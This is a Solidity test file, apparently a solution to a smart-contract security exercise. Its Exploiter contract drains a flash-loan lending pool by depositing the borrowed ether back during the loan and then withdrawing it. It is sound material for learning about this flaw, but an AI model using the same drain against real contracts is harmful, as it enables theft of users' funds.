// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Test} from "forge-std/Test.sol";
import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntrance is Test {
    address player = makeAddr("player");

    SideEntranceLenderPool pool;

    uint256 public constant ETHER_IN_POOL = 1_000 * 1e18;
    uint256 public constant PLAYER_INITIAL_ETH_BALANCE = 1 * 1e18;

    function setUp() public {
        pool = new SideEntranceLenderPool();
        vm.deal(address(pool), ETHER_IN_POOL);
        assertEq(address(pool).balance, ETHER_IN_POOL);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    function test_can_take_all_eth_from_pool() public {
        vm.startPrank(player);
        Exploiter exploit = new Exploiter(address(pool));
        exploit.initiate();
        exploit.withdrawFromPool();
        exploit.withdraw();
        pool.withdraw();
        vm.stopPrank();
        assertEq(address(pool).balance, 0);
        assertGt(player.balance, ETHER_IN_POOL);
    }
}

contract Exploiter is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address owner;

    uint256 public constant ETHER_IN_POOL = 1_000 * 1e18;

    constructor(address _pool) {
        owner = msg.sender;
        pool = SideEntranceLenderPool(_pool);
    }

    function initiate() external {
        pool.flashLoan(ETHER_IN_POOL);
    }

    function execute() external payable {
        pool.deposit{value: ETHER_IN_POOL}();
    }

    function withdrawFromPool() external {
        pool.withdraw();
    }

    receive() external payable {}

    function withdraw() external {
        if (msg.sender != owner) revert();
        payable(msg.sender).transfer(address(this).balance);
    }
}
